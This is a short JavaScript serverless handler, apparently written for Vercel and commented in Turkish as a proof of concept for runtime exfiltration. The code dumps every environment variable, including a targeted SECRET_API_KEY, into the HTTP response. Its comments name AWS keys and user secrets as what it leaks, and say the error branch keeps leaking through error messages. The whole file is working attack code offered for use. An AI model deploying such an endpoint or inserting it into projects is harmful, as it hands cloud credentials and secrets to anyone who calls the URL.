/**
 * VERCEL RUNTIME EXFILTRATION POC - Phase 1
 * Bu kod, çalışma ortamındaki (runtime) tüm gizli değişkenleri 
 * ve altyapı anahtarlarını sızdırmak için kullanılan versiyondur.
 */

module.exports = async (req, res) => {
  try {
    // 1. Sistemdeki tüm çevre değişkenlerini (Environment Variables) topla
    // Bu işlem AWS anahtarları, Vercel sistem değişkenleri ve kullanıcı sırlarını kapsar.
    const allEnvVariables = process.env;

    // 2. Özellikle hedeflediğimiz özel gizli anahtarı doğrula
    const targetSecret = process.env.SECRET_API_KEY || "Not Found";

    // 3. Toplanan tüm hassas veriyi JSON formatında dışarıya sızdır
    res.status(200).json({
      poc: "Full Environment Variable Dump",
      target_secret: targetSecret,
      all_env: allEnvVariables
    });

  } catch (error) {
    // Hata durumunda bile hata mesajı üzerinden bilgi sızdırmaya devam et
    res.status(500).json({
      error: "Exfiltration failed",
      details: error.message
    });
  }
};
